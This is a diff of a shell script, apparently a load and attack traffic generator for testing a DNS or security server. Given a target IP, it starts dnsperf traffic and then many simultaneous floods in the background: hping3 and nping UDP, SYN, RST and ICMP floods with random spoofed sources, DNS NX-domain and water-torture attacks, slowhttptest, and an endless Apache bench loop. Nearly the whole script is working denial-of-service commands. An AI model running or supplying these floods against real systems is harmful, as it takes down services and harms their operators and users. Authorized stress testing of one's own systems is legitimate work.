@@ -1,7 +1,7 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.1.13
-#  10-25-18
+# Version 0.1.14
+#  10-31-18
 
 if [ -z "$1" ]
 then
@@ -9,7 +9,7 @@ then
       exit
 else
       server_ip=$1
-      echo "ES Server is set to $server_ip \r\n"
+      echo "Server is set to $server_ip \r\n"
 fi
 
 
@@ -54,31 +54,41 @@ fi
 
 if [ -f queryfile-example-current ]
 then
-      #little traffic
       #sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q 25
-
-      #Flood: 
+      echo "Running DNS Perf to generate alot of ligitimate DNS traffic from Nominum sample data, to the DNS Server. \r\n \r\n"
       sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q $queries_ps 2> /dev/null &
       wait
 fi
 
 if [ -f test.net.txt ]
 then
+      echo "Running custom created DNS Perf script, which generates alot of benign traffic. \r\n \r\n "
       dnsperf -s $server_ip -d test.net.txt -b 100000  -t 2 -c 100 -q 100000 -l 300 2> /dev/null &
 fi
 
 #-----------------------------------------------------------------------------------------------------------------
 # Hping3 Attacks
-hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &
-hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &
-hping3 $server_ip --udp -d 1400 -p ++2001 -s 53 --keep -c 1000000 --faster --rand-source 2> /dev/null &
-hping3 $server_ip -p 80 –SF --flood 2> /dev/null &
-hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &
-hping3 --verbose --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &
+echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
+sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &
+
+echo "Running HPing3 attack script towards FTP... \r\n"
+sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &
+
+echo "Running HPing3 flood attack to HTTP \r\n "
+sudo hping3 $server_ip -p 80 –SF --flood 2> /dev/null &
+
+echo "Running ping flood attack from random sources \r\n"
+sudo hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &
+
+echo "Running syn flood attack from random sources, towards a webserver \r\n "
+sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &
 
 #------ Attack traffic ----------
-python attack_dns_nxdomain.py $server_ip example.com 10000 2> /dev/null &
-./attack_dns_watertorture_wget.sh example.com 2> /dev/null &
+echo "Running NX Domain attack python script... \r\n "
+sudo python attack_dns_nxdomain.py $server_ip example.com 10000 2> /dev/null &
+
+echo "Running DNS Water Torture attack against server"
+sudo ./attack_dns_watertorture_wget.sh $server_ip 2> /dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
 RATE=5000
@@ -88,25 +98,32 @@ NPING_SILENT='-HNq'
 VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
 INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"
 
-# A query flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT 2> /dev/null &
-#NX domain flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT 2> /dev/null &
-#NTP flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &
-#SYN Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &
-#ICMP Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &
-#RST Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
+echo "Performing a DNS query flood \r\n "
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT 2> /dev/null &
+
+echo "Performing a NX domain flood \r\n "
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT 2> /dev/null &
+
+echo "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &
+
+echo "Performing a TCP SYN Flood towards SSH \r\n"
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &
+
+echo "Performing a ICMP Flood \r\n "
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &
+
+echo "Performing a RST Flood on TCP towards SSH \r\n "
+sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
 
 #--- Webflow -----
-./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3 2> /dev/null &
+echo "Performing a Slow HTTP Test script against webserver \r\n "
+sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
 
 #---- apache bench attack ----
+echo "Starting a Apache bench strest test... \r\n"
 while true
 do
     ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null &
